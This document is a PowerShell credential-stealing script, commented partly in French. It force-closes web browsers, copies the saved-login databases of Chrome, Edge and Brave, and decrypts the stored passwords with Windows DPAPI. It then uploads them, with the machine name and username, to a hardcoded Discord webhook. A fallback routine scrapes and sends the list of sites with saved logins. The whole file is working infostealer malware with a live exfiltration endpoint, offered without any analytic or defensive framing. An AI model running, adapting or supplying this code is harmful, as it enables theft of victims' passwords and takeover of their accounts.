$wh="https://discord.com/api/webhooks/1467465390576766998/4_TcKXgnZalThMN2QWyUY3q-H_IPWFR_Y1C2YqXnVcM-G_cxPZeTatGBSkTtCIRr_yGX"

function Send-Discord { param([string]$m) try { irm $wh -Method Post -Body (@{content=$m}|ConvertTo-Json) -ContentType 'application/json' | Out-Null } catch {} }

Send-Discord "🟢 **START** - $env:COMPUTERNAME | $env:USERNAME"

# Tuer navigateurs
Get-Process chrome,msedge,brave,firefox -EA 0 | Stop-Process -Force -EA 0
Start-Sleep 4

Send-Discord "🔓 **Extracting passwords...**"

# Script PowerShell pur - AUCUN téléchargement nécessaire
$code = @'
Add-Type -AssemblyName System.Security
function Get-Passwords {
    param($dbPath, $browserName)
    if (!(Test-Path $dbPath)) { return @() }
    $tempDb = "$env:TEMP\ldb_$browserName"
    Copy-Item $dbPath $tempDb -Force -EA 0
    $results = @()
    try {
        [void][System.Reflection.Assembly]::LoadWithPartialName('System.Data.SQLite')
        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb")
        $conn.Open()
        $cmd = $conn.CreateCommand()
        $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins WHERE username_value != ''"
        $reader = $cmd.ExecuteReader()
        while ($reader.Read()) {
            $url = $reader.GetString(0)
            $user = $reader.GetString(1)
            if (!$reader.IsDBNull(2)) {
                $enc = New-Object byte[] $reader.GetBytes(2,0,$null,0,0)
                $reader.GetBytes(2,0,$enc,0,$enc.Length) | Out-Null
                try {
                    $dec = [System.Security.Cryptography.ProtectedData]::Unprotect($enc,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
                    $pass = [System.Text.Encoding]::UTF8.GetString($dec)
                    $results += "[$browserName]`n$url`n$user : $pass`n"
                } catch {}
            }
        }
        $reader.Close()
        $conn.Close()
    } catch {}
    Remove-Item $tempDb -Force -EA 0
    return $results
}

$all = @()
$all += Get-Passwords "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" "CHROME"
$all += Get-Passwords "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data" "EDGE"
$all += Get-Passwords "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data" "BRAVE"
return $all
'@

try {
    $passwords = Invoke-Expression $code
    
    if ($passwords.Count -gt 0) {
        $file = "$env:TEMP\pwds.txt"
        "=== PASSWORDS ===`n$env:COMPUTERNAME | $env:USERNAME`n$(Get-Date)`n`n" | Out-File $file
        $passwords | Out-File $file -Append
        
        Send-Discord "📤 **Uploading $($passwords.Count) passwords...**"
        curl.exe -F "file=@$file" -F "content=🔑 **$($passwords.Count) PASSWORDS**`n$env:COMPUTERNAME" $wh
        Remove-Item $file -Force
        Send-Discord "✅ **SUCCESS**"
    } else {
        Send-Discord "⚠️ **No passwords OR SQLite not available**"
        Send-Discord "📥 **Trying alternative method...**"
        
        # Méthode alternative : raw binary parsing
        $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
        if (Test-Path $chromePath) {
            $temp = "$env:TEMP\chr_login"
            Copy-Item $chromePath $temp -Force
            $bytes = [IO.File]::ReadAllBytes($temp)
            $text = [Text.Encoding]::ASCII.GetString($bytes)
            
            # Extract URLs
            $urls = [regex]::Matches($text, 'https?://[a-zA-Z0-9\-\.]+\.[a-z]{2,}') | Select -Unique -First 30
            
            $file = "$env:TEMP\urls.txt"
            "=== SITES WITH SAVED PASSWORDS ===`n" | Out-File $file
            $urls.Value | Out-File $file -Append
            
            curl.exe -F "file=@$file" -F "content=📋 **LOGIN SITES** - $env:COMPUTERNAME" $wh
            Remove-Item $file,$temp -Force -EA 0
            Send-Discord "✅ **Sent site list**"
        }
    }
} catch {
    Send-Discord "❌ **Error:** $($_.Exception.Message)"
}

Send-Discord "🧹 **DONE**"
